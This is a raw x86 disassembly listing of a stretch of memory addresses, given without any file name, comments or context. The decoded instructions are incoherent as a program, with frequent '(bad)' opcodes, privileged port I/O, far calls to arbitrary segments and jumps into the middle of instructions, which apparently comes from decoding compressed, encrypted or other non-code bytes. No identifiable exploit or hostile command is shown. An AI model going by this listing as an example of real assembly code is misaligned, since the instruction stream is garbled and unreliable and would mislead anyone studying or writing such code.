  4250a2:	loopne 0x4250cc
  4250a4:	xor    eax,0xa40716c8
  4250a9:	in     eax,dx
  4250aa:	xor    ebp,esi
  4250ac:	cmovne ecx,DWORD PTR [eax-0x31]
  4250b0:	test   BYTE PTR [eax-0x332addc],al
  4250b6:	sub    bh,cl
  4250b8:	iret   
  4250b9:	out    0x71,al
  4250bb:	jo     0x42506f
  4250bd:	xor    dl,BYTE PTR [ecx+ecx*2]
  4250c0:	jb     0x425061
  4250c2:	addr16 add al,0x2d
  4250c5:	sbb    al,0xcf
  4250c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250c8:	pop    ss
  4250c9:	in     eax,0x84
  4250cb:	ror    DWORD PTR ds:0x9242e412,cl
  4250d1:	push   es
  4250d2:	pushf  
  4250d3:	inc    esp
  4250d4:	dec    BYTE PTR [eax+0x7ec1964e]
  4250da:	adc    ebp,DWORD PTR [edx]
  4250dc:	aaa    
  4250dd:	test   BYTE PTR [edi],bl
  4250df:	add    al,dh
  4250e1:	test   eax,0x67563f4b
  4250e6:	cmp    eax,0x2f225bd2
  4250eb:	fsubr  st,st(1)
  4250ed:	mov    bl,0x7c
  4250ef:	mov    dh,0xbd
  4250f1:	jo     0x42511f
  4250f3:	(bad)  
  4250f4:	jb     0x4250a0
  4250f6:	cmp    edi,esi
  4250f8:	cmp    dh,BYTE PTR [ebp-0x1e250321]
  4250fe:	shl    ecx,1
  425100:	int3   
  425101:	daa    
  425102:	pop    DWORD PTR [eax+0x15]
  425105:	lods   eax,DWORD PTR ds:[esi]
  425106:	and    ah,BYTE PTR [ecx+0x6621dd60]
  42510c:	mov    cl,0xca
  42510e:	loope  0x4250a2
  425110:	push   ebp
  425111:	mov    ds:0x18d7bf47,eax
  425116:	das    
  425117:	ror    esp,0x7b
  42511a:	jo     0x4250fc
  42511c:	fwait
  42511d:	daa    
  42511e:	xor    bh,bh
  425120:	push   ecx
  425121:	das    
  425122:	or     DWORD PTR [esi],edi
  425124:	retf   
  425125:	fsubr  st(7),st
  425127:	or     DWORD PTR [ebp-0xb],0xc85df19b
  42512e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42512f:	leave  
  425130:	stc    
  425131:	push   ecx
  425132:	loopne 0x42514f
  425134:	adc    al,0xf9
  425136:	pop    edx
  425137:	jno    0x4250c0
  425139:	mov    BYTE PTR [edi-0x33],0xdf
  42513d:	mov    BYTE PTR [ebx-0x1ecb739b],ah
  425143:	lahf   
  425144:	mov    al,ds:0x44951e6c
  425149:	scas   al,BYTE PTR es:[edi]
  42514a:	mov    ch,0xac
  42514c:	daa    
  42514d:	push   esp
  42514e:	shr    DWORD PTR [edx+ecx*1-0xf],cl
  425152:	cmp    bl,BYTE PTR [ebx+0x2cfc915b]
  425158:	pushf  
  425159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42515a:	or     esi,ebp
  42515c:	fdiv   QWORD PTR [esi]
  42515e:	sub    ah,ch
  425160:	sahf   
  425161:	pop    ds
  425162:	push   0x40
  425164:	retf   0x5028
  425167:	mov    cl,0x99
  425169:	jle    0x425159
  42516b:	fcom   QWORD PTR [ecx+0x54dec6c2]
  425171:	fbld   TBYTE PTR [ebx+0x68]
  425174:	add    edx,eax
  425176:	jle    0x42511e
  425178:	sbb    al,BYTE PTR [edi+ecx*1]
  42517b:	into   
  42517c:	popf   
  42517d:	adc    al,0x9c
  42517f:	loope  0x4251ee
  425181:	mov    ebx,0x5d00dd66
  425186:	and    esp,DWORD PTR [ebx-0x4a6d33cb]
  42518c:	iret   
  42518d:	mov    edx,0xccfa3bfe
  425192:	inc    esi
  425193:	pop    ebp
  425194:	inc    edx
  425195:	inc    eax
  425196:	test   BYTE PTR [ebx],dl
  425198:	dec    ecx
  425199:	cmc    
  42519a:	dec    ecx
  42519b:	(bad)  
  42519c:	pop    edx
  42519d:	lds    ecx,FWORD PTR [ebp-0x2bb1830]
  4251a3:	gs push ecx
  4251a5:	cmp    al,0xa2
  4251a7:	(bad)  
  4251a8:	jno    0x42518e
  4251aa:	stc    
  4251ab:	mov    DWORD PTR [ecx+ecx*8+0x6f],esi
  4251af:	test   eax,0x3ec64c5f
  4251b4:	stc    
  4251b5:	sbb    BYTE PTR [edx],ah
  4251b7:	mov    dl,0x5f
  4251b9:	pop    ds
  4251ba:	retf   
  4251bb:	and    DWORD PTR [eax],edx
  4251bd:	call   0x21a2:0x4a433337
  4251c4:	ds xchg edx,eax
  4251c6:	je     0x425233
  4251c8:	dec    ebp
  4251c9:	call   0xa5b:0xe305d727
  4251d0:	push   ebp
  4251d1:	gs retf 0xc2a4
  4251d5:	push   edx
  4251d6:	pop    ebx
  4251d7:	push   0xaacaaa92
  4251dc:	call   0xf9c0:0xd9a4983c
  4251e3:	pushf  
  4251e4:	js     0x4251ff
  4251e6:	pop    ebp
  4251e7:	adc    DWORD PTR ds:0x5bb42b13,ecx
  4251ed:	imul   esi,edx,0x2b8ce5e3
  4251f3:	inc    ecx
  4251f4:	pop    ds
  4251f5:	ins    DWORD PTR es:[edi],dx
  4251f6:	pop    eax
  4251f7:	inc    ebx
  4251f8:	inc    esi
  4251f9:	or     eax,0xa5faba81
  4251fe:	addr16 ret 0xcc79
  425202:	and    ah,BYTE PTR [edi-0x47]
  425205:	(bad)  
  425206:	hlt    
  425207:	and    eax,DWORD PTR [eax+ecx*1-0x1b5de3cd]
  42520e:	lea    ebp,cs:[edi+ebx*2+0x6d]
  425213:	out    dx,al
  425214:	mov    ecx,0x16035f82
  425219:	mov    al,ds:0x2a9f9e1d
  42521e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42521f:	shr    BYTE PTR [esi+0x13],0xa6
  425223:	cmp    DWORD PTR [edi+esi*1+0x1bc3118c],0xfffffff6
  42522b:	pusha  
  42522c:	std    
  42522d:	outs   dx,DWORD PTR ds:[esi]
  42522e:	fstp   QWORD PTR [edx+ebx*2-0x1]
  425232:	sub    BYTE PTR [eax-0x2d37ebf5],ch
  425238:	xchg   edi,eax
  425239:	mov    edx,0x35b65b85
  42523e:	scas   al,BYTE PTR es:[edi]
  42523f:	cmp    bl,ch
  425241:	imul   ebp,DWORD PTR [esi],0xdabcd117
  425247:	cmp    DWORD PTR [ecx-0x295375bf],0xd255f88c
  425251:	iret   
  425252:	jb     0x425253
  425254:	les    esi,FWORD PTR [edi+0x574b6eab]
  42525a:	dec    ebx
  42525b:	aaa    
  42525c:	lahf   
  42525d:	adc    ch,BYTE PTR [esi]
  42525f:	jne    0x42525e
  425261:	ja     0x42524b
  425263:	stos   BYTE PTR es:[edi],al
  425264:	(bad)  
  425265:	jno    0x425262
  425267:	dec    esp
  425268:	sbb    eax,0x2802b6d4
  42526d:	aas    
	...
  42527a:	hlt    
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	inc    ecx
  425287:	test   BYTE PTR [eax-0x2],cl
  42528a:	js     0x425256
  42528c:	add    DWORD PTR [eax],eax
  42528e:	cld    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    BYTE PTR [edx],dh
  425293:	outs   dx,DWORD PTR ds:[esi]
  425294:	fsub   DWORD PTR [ebx-0x570adb27]
  42529a:	cmp    BYTE PTR [esi-0x61],ah
  42529d:	push   es
  42529e:	gs shl edi,cl
  4252a1:	ficomp DWORD PTR [edx+0x7a]
  4252a4:	popf   
  4252a5:	cmp    eax,0xed9cee6b
  4252aa:	or     esp,DWORD PTR [edi-0x27]
  4252ad:	ins    BYTE PTR es:[edi],dx
  4252ae:	je     0x4252eb
  4252b0:	and    dh,0x72
  4252b3:	xor    BYTE PTR [ebx],bh
  4252b5:	inc    ebx
  4252b6:	push   ecx
  4252b7:	aaa    
  4252b8:	adc    esi,DWORD PTR [edx+edi*2-0x42]
  4252bc:	jns    0x425301
  4252be:	leave  
  4252bf:	fiadd  DWORD PTR [ebx-0x4cf3172f]
  4252c5:	add    al,0xf
  4252c7:	jecxz  0x425335
  4252c9:	js     0x425342
  4252cb:	jmp    FWORD PTR [ebp+eiz*4+0x1a]
  4252cf:	aad    0x91
  4252d1:	shr    DWORD PTR [ecx],cl
  4252d3:	fucomi st,st(2)
  4252d5:	ins    BYTE PTR es:[edi],dx
  4252d6:	mov    bh,0x12
  4252d8:	pop    eax
  4252d9:	fpatan 
  4252db:	icebp  
  4252dc:	daa    
  4252dd:	bound  edi,QWORD PTR [eax]
  4252df:	bound  ebx,QWORD PTR [esi]
  4252e1:	aaa    
  4252e2:	retf   0x8c38
  4252e5:	dec    edi
  4252e6:	xor    esi,edi
  4252e8:	imul   edi,DWORD PTR [ebp+0x48],0x10
  4252ec:	fnstenv [ebx+0x4f]
  4252ef:	cmp    edx,esp
  4252f1:	mov    ch,0xb8
  4252f3:	out    dx,al
  4252f4:	icebp  
  4252f5:	pop    edx
  4252f6:	(bad)  
  4252f7:	in     eax,dx
  4252f8:	in     eax,0x7c
  4252fa:	sub    al,0x28
  4252fc:	retf   
  4252fd:	data16 (bad) 
  4252ff:	imul   ebp,DWORD PTR [ebp+0x3],0x1b
  425303:	mov    fs:0xda917839,eax
  425309:	jo     0x42528e
  42530b:	jp     0x42530f
  42530d:	and    eax,0x4eba011a
  425312:	ret    0xc375
  425315:	stc    
  425316:	adc    al,BYTE PTR [ecx+eiz*8-0x4f099945]
  42531d:	shl    DWORD PTR [ecx],0xbe
  425320:	xor    al,0x79
  425322:	jae    0x4252d8
  425324:	cmc    
  425325:	add    eax,0x41f1b083
  42532a:	in     al,dx
  42532b:	jp     0x42536c
  42532d:	or     cl,dh
  42532f:	jns    0x425317
  425331:	js     0x425308
  425333:	test   BYTE PTR [ebx],ah
  425335:	add    al,0x4a
  425337:	mov    bh,0x7
  425339:	dec    esi
  42533a:	lahf   
  42533b:	addr16 int 0xaf
  42533e:	and    ebp,DWORD PTR [ecx-0x7b]
  425341:	in     al,0x2c
  425343:	fist   DWORD PTR [eax+0x6b]
  425346:	fisub  WORD PTR [esi-0x57]
  425349:	pop    ds
  42534a:	in     eax,0xfb
  42534c:	sahf   
  42534d:	test   al,0x9c
  42534f:	into   
  425350:	loop   0x4252e3
  425352:	mov    ah,0x25
  425354:	push   ebx
  425355:	in     al,dx
  425356:	mov    eax,ds:0xea6450a5
  42535b:	mov    bh,0x8a
  42535d:	push   0xfffffff2
  42535f:	pop    esp
  425360:	dec    esi
  425361:	(bad)  
  425362:	iret   
  425363:	cli    
  425364:	fistp  WORD PTR [edx+ebp*4]
  425367:	cmp    ebp,DWORD PTR [edi-0x60]
  42536a:	sti    
  42536b:	out    dx,al
  42536c:	ror    DWORD PTR ds:0x83b5d6e2,1
  425372:	(bad)  
  425373:	sub    BYTE PTR [edx+0x135c1455],dl
  425379:	pop    ebx
  42537a:	xor    eax,0x899f553e
  42537f:	mov    al,0x52
  425381:	leave  
  425382:	sub    al,0x58
  425384:	retf   
  425385:	test   ah,dl
  425387:	dec    esp
  425388:	les    esp,FWORD PTR [ecx+0x23fde584]
  42538e:	xchg   BYTE PTR fs:[edx],ah
  425391:	add    ch,BYTE PTR [ebx-0x21df8a31]
  425397:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425399:	leave  
  42539a:	mov    ds:0x684c6d84,eax
  42539f:	dec    BYTE PTR [ebx-0x1a890dd6]
  4253a5:	sbb    edx,DWORD PTR [ecx-0x31c36e7d]
  4253ab:	cli    
  4253ac:	sub    dl,dl
  4253ae:	jne    0x4253cf
  4253b0:	inc    ebp
  4253b1:	cmp    eax,0x6a87730a
  4253b6:	sbb    esi,DWORD PTR [edx-0xb]
  4253b9:	pop    edi
  4253ba:	fistp  DWORD PTR [edi]
  4253bc:	out    0xc8,eax
  4253be:	jmp    0xf1aeb4d0
  4253c3:	push   ss
  4253c4:	mov    ebx,0xb5e3a0d6
  4253c9:	lods   al,BYTE PTR ds:[esi]
  4253ca:	mov    eax,ds:0x7ee85d3d
  4253cf:	call   0x20d5:0x57016a43
  4253d6:	ret    0xfb15
  4253d9:	xchg   esp,eax
  4253da:	test   al,0x68
  4253dc:	popa   
  4253dd:	xchg   esi,eax
  4253de:	dec    ebx
  4253df:	sub    eax,0x296014eb
  4253e4:	loopne 0x425383
  4253e6:	cs mov bl,ch
  4253e9:	dec    esi
  4253ea:	shr    BYTE PTR [esi+0x5c50a7d3],cl
  4253f0:	mov    ds:0x679e3cb2,eax
  4253f5:	int    0xab
  4253f7:	repnz xlat BYTE PTR ds:[ebx]
  4253f9:	in     eax,dx
  4253fa:	(bad)  
  4253fb:	adc    al,0xdd
  4253fd:	scas   al,BYTE PTR es:[edi]
  4253fe:	loop   0x425416
  425400:	xchg   ecx,eax
  425401:	fiadd  DWORD PTR [ebx+0x5fe63a09]
  425407:	pop    esi
  425408:	mov    edi,DWORD PTR [esi+ebx*2+0x2d]
  42540c:	pop    edx
  42540d:	ja     0x42541a
  42540f:	daa    
  425410:	mov    eax,ds:0x38b66833
  425415:	in     eax,dx
  425416:	mov    ebp,0x267c19d4
  42541b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42541c:	xchg   BYTE PTR [edi+0x202724a1],al
  425422:	adc    BYTE PTR [esi+0x75],0x8
  425426:	call   0x1161adaf
  42542b:	popf   
  42542c:	cmp    al,0x57
  42542e:	loop   0x425443
  425430:	fs jns 0x4253be
  425433:	out    0xf4,al
  425435:	mov    esi,0x1f3c22b3
  42543a:	popa   
  42543b:	jne    0x425467
  42543d:	imul   BYTE PTR [ebx]
  42543f:	xchg   ebp,eax
  425440:	ss mov edx,edx
  425443:	pop    esi
  425444:	ins    BYTE PTR es:[edi],dx
  425445:	and    bh,BYTE PTR [ebp+ebx*2+0x64]
  425449:	(bad)  
  42544a:	fs pop eax
  42544d:	icebp  
  42544e:	push   cs
  42544f:	inc    esi
  425450:	div    DWORD PTR [edi+0x4a15ed5f]
  425456:	cmp    edi,DWORD PTR [edx]
  425458:	inc    eax
  425459:	inc    esi
  42545a:	repz ja 0x425405
  42545d:	dec    esp
  42545e:	ror    BYTE PTR [edi-0x34],0xae
  425462:	popf   
  425463:	sbb    bl,ch
  425465:	fistp  DWORD PTR [esp+ebx*4-0x10]
  425469:	ret    0x608e
  42546c:	sub    ch,BYTE PTR [esp+edi*8]
  42546f:	cdq    
  425470:	or     DWORD PTR cs:[eax-0x7bc2849e],0x1
  425478:	xor    edi,ebp
  42547a:	fisttp QWORD PTR [edi]
  42547c:	jnp    0x425432
  42547e:	push   eax
  42547f:	mov    ds:0xdc39ed73,eax
  425484:	stos   BYTE PTR es:[edi],al
  425485:	cmp    BYTE PTR [eax+0x27],bh
  425488:	jle    0x42544d
  42548a:	dec    ebp
  42548b:	xchg   ecx,eax
  42548c:	lea    esp,[edi+0x0]
	...
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	adc    ecx,DWORD PTR [esp+esi*8-0x4c]
  4254aa:	je     0x425478
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	cld    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    al,bl
  4254b3:	shl    BYTE PTR [ebp-0x4e],cl
  4254b6:	fld    TBYTE PTR [edi]
  4254b8:	lds    ecx,FWORD PTR [edi]
  4254ba:	call   0x931a7eef
  4254bf:	out    0x0,eax
  4254c1:	xor    al,0xf0
  4254c3:	in     al,0xa1
  4254c5:	ret    
  4254c6:	int    0xfb
  4254c8:	out    0x67,al
  4254ca:	pop    ds
  4254cb:	push   ds
  4254cc:	ret    
  4254cd:	les    esi,FWORD PTR [ebp+0x16]
  4254d0:	les    ecx,FWORD PTR [ebp-0x42]
  4254d3:	mov    ebx,0x4fddbf04
  4254d8:	fild   WORD PTR [eax]
  4254da:	cli    
  4254db:	or     ah,al
  4254dd:	fcmovnbe st,st(2)
  4254df:	xchg   ecx,eax
  4254e0:	or     eax,0x7d12fdda
  4254e5:	inc    eax
  4254e6:	mov    esi,0xcfc0cb5c
  4254eb:	sub    eax,0x488bf99d
  4254f0:	push   es
  4254f1:	daa    
  4254f2:	fiadd  WORD PTR [edx+0xc]
  4254f5:	jnp    0x4254a1
  4254f7:	mov    esp,0xeb00000a
  4254fc:	inc    esi
  4254fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254fe:	in     al,0x29
  425500:	cmp    eax,0x9fb87aa
  425505:	sbb    DWORD PTR [ebp-0x3b],eax
  425508:	rol    DWORD PTR [esi-0x59],cl
  42550b:	lahf   
  42550c:	(bad)  
  42550d:	pop    ss
  42550e:	jge    0x4254d0
  425510:	xor    eax,0x440fe8fc
  425515:	pusha  
  425516:	scas   al,BYTE PTR es:[edi]
  425517:	pop    edx
  425518:	test   ebx,edx
  42551a:	sbb    BYTE PTR ds:0x5e83454e,bh
  425520:	inc    ebx
  425521:	xchg   esp,eax
  425522:	and    eax,0x336abcee
  425527:	aaa    
  425528:	les    edx,FWORD PTR [esi-0x7c55c49b]
  42552e:	jp     0x425533
  425530:	xor    BYTE PTR [eax-0x67],al
  425533:	loopne 0x42559a
  425535:	xchg   esp,eax
  425536:	dec    eax
  425537:	(bad)  
  425538:	jae    0x4254e3
  42553a:	inc    eax
  42553b:	es gs cmp al,0x52
  42553f:	adc    al,0xbd
  425541:	pop    esp
  425542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425543:	cs retf 
  425545:	fistp  DWORD PTR [ecx]
  425547:	popf   
  425548:	js     0x425504
  42554a:	adc    BYTE PTR [ecx+0x5768b2f3],ah
  425550:	in     al,0xe1
  425552:	pop    es
  425553:	mov    ecx,0xa155504
  425558:	cmc    
  425559:	nop
  42555a:	adc    esi,ecx
  42555c:	mov    al,ds:0xeb0e14ae
  425561:	pop    es
  425562:	mov    ebp,0x46c87f50
  425567:	xchg   edi,eax
  425568:	xor    esp,DWORD PTR [ebx+edi*4+0x25]
  42556c:	sbb    eax,0xccf8e4a8
  425571:	add    esp,DWORD PTR [edx-0x7e]
  425574:	into   
  425575:	pop    es
  425576:	jmp    0x922c:0xe09259b9
  42557d:	stos   DWORD PTR es:[edi],eax
  42557e:	push   ebx
  42557f:	call   0x4060:0x3368bc6e
  425586:	pop    esp
  425587:	out    0x5a,al
  425589:	mov    edi,0x482f4ac2
  42558e:	adc    edi,DWORD PTR [ebp+0x789c6752]
  425594:	sub    DWORD PTR [eax],ebp
  425596:	into   
  425597:	or     dh,BYTE PTR es:[eax-0x1e849285]
  42559e:	or     eax,0xe2469cb
  4255a3:	xchg   DWORD PTR [ebx-0x3234b58b],eax
  4255a9:	lods   al,BYTE PTR ds:[esi]
  4255aa:	std    
  4255ab:	(bad)  
  4255ac:	mov    ds:0x9e97520b,eax
  4255b1:	pop    esp
  4255b2:	mov    BYTE PTR [ebp+0x11],dl
  4255b5:	lods   al,BYTE PTR ds:[esi]
  4255b6:	imul   edi,DWORD PTR [ebx],0xffffffba
  4255b9:	mov    WORD PTR [ebx+0x52],?
  4255bc:	mov    WORD PTR [edi+0x7374a892],?
  4255c2:	push   ebp
  4255c3:	outs   dx,DWORD PTR ds:[esi]
  4255c4:	add    ebp,DWORD PTR [edx-0x1193b287]
  4255ca:	addr16 mov edi,0xf4ca4ef0
  4255d0:	sub    dl,BYTE PTR [ecx]
  4255d2:	dec    edi
  4255d3:	mov    esp,0x860051f3
  4255d8:	xchg   esi,eax
  4255d9:	imul   ebp,edi,0x242fe9d
  4255df:	xchg   ebp,eax
  4255e0:	jmp    0x425651
  4255e2:	xor    eax,0xe641923f
  4255e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255e8:	ds mov cl,0x5c
  4255eb:	data16 je 0x4255b6
  4255ee:	aaa    
  4255ef:	mov    DWORD PTR [ebx+edi*4-0x25c34ca2],ecx
  4255f6:	mov    dl,0x7
  4255f8:	pop    es
  4255f9:	mov    cl,0x5b
  4255fb:	push   ebp
  4255fc:	mov    ah,BYTE PTR [edx-0x2b]
  4255ff:	xor    BYTE PTR es:[edx-0x58],0xdb
  425604:	adc    ebx,DWORD PTR [esi+0x60]
  425607:	pop    ecx
  425608:	mov    esp,0x3ff33f06
  42560d:	jecxz  0x425662
  42560f:	adc    esi,DWORD PTR [ebx-0x79]
  425612:	xchg   DWORD PTR [edx],ebx
  425614:	stos   BYTE PTR es:[edi],al
  425615:	sub    eax,ebp
  425617:	test   BYTE PTR [ebx],dh
  425619:	dec    ebp
  42561a:	in     al,0x61
  42561c:	imul   edi,DWORD PTR [eax],0x9
  42561f:	and    DWORD PTR [eax-0x2a],ecx
  425622:	pop    ebx
  425623:	dec    ebp
  425624:	jb     0x4255d7
  425626:	dec    esp
  425627:	jge    0x425667
  425629:	outs   dx,DWORD PTR ds:[esi]
  42562a:	xchg   esp,eax
  42562b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42562c:	(bad)  
  42562d:	mov    edi,0xf92f3ae
  425632:	jno    0x425654
  425634:	bound  esp,QWORD PTR [eax+esi*1]
  425637:	sub    eax,DWORD PTR [edx]
  425639:	cmp    eax,0xb1670823
  42563e:	or     eax,0xe903652c
  425643:	outs   dx,BYTE PTR ds:[esi]
  425644:	mov    bl,0xfa
  425646:	push   esp
  425647:	fsub   QWORD PTR [esi+0x2198b50b]
  42564d:	jp     0x425663
  42564f:	gs fcmovbe st,st(0)
  425652:	push   ds
  425653:	mov    BYTE PTR [ebx+0x3d],dh
  425656:	mov    al,ds:0x8a3df0d4
  42565b:	mov    ebp,0x91d9971a
  425660:	ret    0xbe05
  425663:	ins    DWORD PTR es:[edi],dx
  425664:	js     0x4256a9
  425666:	dec    ebp
  425667:	and    DWORD PTR [ecx+0x2dff7246],edi
  42566d:	sbb    BYTE PTR [eax],dl
  42566f:	adc    DWORD PTR [eax],edi
  425671:	push   ds
  425672:	das    
  425673:	hlt    
  425674:	mov    ds:0x2fba15bf,eax
  425679:	mov    dh,dh
  42567b:	push   cs
  42567c:	addr16 xchg bh,al
  42567f:	dec    ecx
  425680:	xchg   esp,eax
  425681:	inc    esp
  425682:	and    al,0xeb
  425684:	mov    eax,0x5ae6049a
  425689:	mov    ah,0x8d
  42568b:	mov    eax,ds:0x6d769962
  425690:	outs   dx,DWORD PTR ds:[esi]
  425691:	shld   DWORD PTR [edi+0x3a],edx,cl
  425695:	pop    ds
  425696:	std    
  425697:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  425699:	xor    al,0xe3
  42569b:	out    dx,eax
  42569c:	mov    bl,0x93
  42569e:	pop    esi
  42569f:	dec    edi
  4256a0:	gs or  al,0x82
  4256a3:	jne    0x4256bf
  4256a5:	sub    eax,0x2aef9833
  4256aa:	mov    dl,0x51
  4256ac:	sub    dh,BYTE PTR [eax+eax*1]
	...
  4256b7:	add    BYTE PTR [eax],al
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	dec    eax
  4256c7:	bound  esp,QWORD PTR [eax]
  4256c9:	fbstp  TBYTE PTR [eax-0x32]
  4256cc:	add    DWORD PTR [eax],eax
  4256ce:	cld    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    bl,cl
  4256d3:	int    0x20
  4256d5:	pop    ds
  4256d6:	mov    ch,0x52
  4256d8:	pop    ds
  4256d9:	rcr    DWORD PTR [ebx-0x5a],0x36
  4256dd:	mov    DWORD PTR [ecx],esp
  4256df:	ins    DWORD PTR es:[edi],dx
  4256e0:	cmc    
  4256e1:	lods   eax,DWORD PTR ds:[esi]
  4256e2:	mov    ah,0xb4
  4256e4:	pop    esp
  4256e5:	aas    
  4256e6:	ror    BYTE PTR [edx+0x2c],1
  4256e9:	inc    edx
  4256ea:	sbb    al,0xb5
  4256ec:	add    ch,BYTE PTR [eax+0x6d7b4a1f]
  4256f2:	in     eax,0x4a
  4256f4:	pop    ds
  4256f5:	or     bh,al
  4256f7:	out    0x3b,eax
  4256f9:	fmul   DWORD PTR [ebx+0x54d9d1eb]
  4256ff:	inc    eax
  425700:	ficom  DWORD PTR [ecx]
  425702:	mov    edi,ss
  425704:	sbb    DWORD PTR [ebp+0x3f206449],edi
  42570a:	adc    eax,0xc2797887
  42570f:	pop    ss
  425710:	(bad)  
  425712:	nop
  425713:	js     0x42571a
  425715:	test   BYTE PTR [edi],al
  425717:	test   edx,edx
  425719:	jp     0x425760
  42571b:	jmp    0x9e8bc3b1
  425720:	push   cs
  425721:	adc    eax,DWORD PTR [ecx-0x62]
  425724:	cmp    al,0x27
  425726:	call   0x1f0b:0x9add2ae4
  42572d:	jecxz  0x42578d
  42572f:	dec    edi
  425730:	aad    0x6d
  425732:	xchg   edi,eax
  425733:	(bad)  
  425734:	sbb    eax,0x6e8993f7
  425739:	xor    eax,0xab394067
  42573e:	jns    0x42574b
  425740:	pop    es
  425741:	sub    al,0x5a
  425743:	adc    BYTE PTR [ecx],bh
  425745:	push   0x6fceb868
  42574a:	popf   
  42574b:	pop    esp
  42574c:	jo     0x425755
  42574e:	pop    esi
  42574f:	hlt    
  425750:	mov    WORD PTR [ebx-0x1c],ds
  425753:	repz cwde 
  425755:	fimul  DWORD PTR [ecx-0x6f60031d]
  42575b:	push   cs
  42575c:	xchg   dh,bl
  42575e:	inc    edx
  42575f:	cmp    eax,0x9dc9dca8
  425764:	add    al,0x18
  425766:	rcl    WORD PTR [ebp+eax*4+0x11],0x6a
  42576c:	loop   0x42576f
  42576e:	sahf   
  42576f:	out    0x5d,al
  425771:	cmc    
  425772:	rol    BYTE PTR [ebx],0xb2
  425775:	aam    0x8d
  425777:	pop    ecx
  425778:	fist   WORD PTR [ebx]
  42577a:	xchg   esp,eax
  42577b:	icebp  
  42577c:	mov    bl,0x14
  42577e:	mov    dl,ch
  425780:	in     eax,0xd3
  425782:	aas    
  425783:	sub    BYTE PTR [edi+0x5270c209],bl
  425789:	mov    al,0x34
  42578b:	push   esi
  42578c:	daa    
  42578d:	jo     0x4257d0
  42578f:	jo     0x425748
  425791:	stos   BYTE PTR es:[edi],al
  425792:	dec    esp
  425793:	sub    al,0xdd
  425795:	push   edi
  425796:	jne    0x42577c
  425798:	dec    edx
  425799:	call   0x603508f
  42579e:	cmp    BYTE PTR [ebp+0x7c],dl
  4257a1:	xchg   ecx,eax
  4257a2:	dec    esi
  4257a3:	mov    ah,ah
  4257a5:	mov    WORD PTR [eax+esi*2+0x16d8f12b],ds
  4257ac:	dec    ecx
  4257ad:	adc    DWORD PTR [esi+0x2f8aea3a],ebx
  4257b3:	lock inc edi
  4257b5:	std    
  4257b6:	mov    esp,0xd3cf3b54
  4257bb:	inc    esp
  4257bc:	test   eax,0x52d81a4
  4257c1:	adc    ebp,esp
  4257c3:	push   ecx
  4257c4:	es pop ebp
  4257c6:	in     al,0xad
  4257c8:	xchg   edx,eax
  4257c9:	mov    DWORD PTR [eax-0x37a738ac],ecx
  4257cf:	xor    ebx,DWORD PTR [ebp+ebp*1-0x43]
  4257d3:	sbb    BYTE PTR [esi+0x7a],al
  4257d6:	xlat   BYTE PTR ds:[ebx]
  4257d7:	add    BYTE PTR ds:0x986ed9fa,cl
  4257dd:	icebp  
  4257de:	or     edi,eax
  4257e0:	add    al,0x66
  4257e2:	ficomp DWORD PTR [ebx+0x50]
  4257e5:	mov    WORD PTR ss:[edx-0x2312dc42],fs
  4257ec:	cwde   
  4257ed:	cli    
  4257ee:	je     0x4257d2
  4257f0:	sub    al,0xe0
  4257f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257f3:	push   ss
  4257f4:	add    dl,bh
  4257f6:	pop    esi
  4257f7:	mov    eax,ds:0xa808db30
  4257fc:	jno    0x425820
  4257fe:	sbb    esp,0x28492151
  425804:	leave  
  425805:	pop    ss
  425806:	xchg   BYTE PTR [edx],cl
  425808:	lahf   
  425809:	xlat   BYTE PTR ds:[ebx]
  42580a:	enter  0xb2f3,0xf
  42580e:	sahf   
  42580f:	push   ds
  425810:	bound  edx,QWORD PTR [edi]
  425812:	jle    0x42585e
  425814:	into   
  425815:	in     eax,dx
  425816:	and    cl,BYTE PTR [eax+0x76fcc35]
  42581c:	add    eax,DWORD PTR [esi]
  42581e:	xchg   edx,eax
  42581f:	and    bl,BYTE PTR [edx+0x17cbf2f7]
  425825:	cmp    al,0x66
  425827:	fdivr  st(7),st
  425829:	mov    edi,0x7784060b
  42582e:	inc    ecx
  42582f:	test   ebp,ecx
  425831:	adc    al,0xd6
  425833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425834:	push   ebx
  425835:	lods   eax,DWORD PTR ds:[esi]
  425836:	iret   
  425837:	scas   eax,DWORD PTR es:[edi]
  425838:	retf   0x87c4
  42583b:	and    eax,0x8201b929
  425840:	ins    DWORD PTR es:[edi],dx
  425841:	or     esi,eax
  425843:	in     al,0x86
  425845:	push   ds
  425846:	xor    BYTE PTR [esi+0x7a],cl
  425849:	test   bl,0xd6
  42584c:	dec    esi
  42584d:	cmp    eax,0xa18049d4
  425852:	or     DWORD PTR [esp+ebp*4],ebp
  425855:	sbb    BYTE PTR [edi-0xe],al
  425858:	mov    esi,0x851f7cf0
  42585d:	mov    edx,0xe7d4eb2c
  425862:	ds call 0x8966c83e
  425868:	dec    edi
  425869:	test   al,0x2e
  42586b:	les    ecx,FWORD PTR [eax-0x425171dc]
  425871:	push   eax
  425872:	je     0x425897
  425874:	and    eax,0xb3800736
  425879:	das    
  42587a:	inc    esp
  42587b:	sbb    eax,0xb7530a3e
  425880:	xchg   ebx,eax
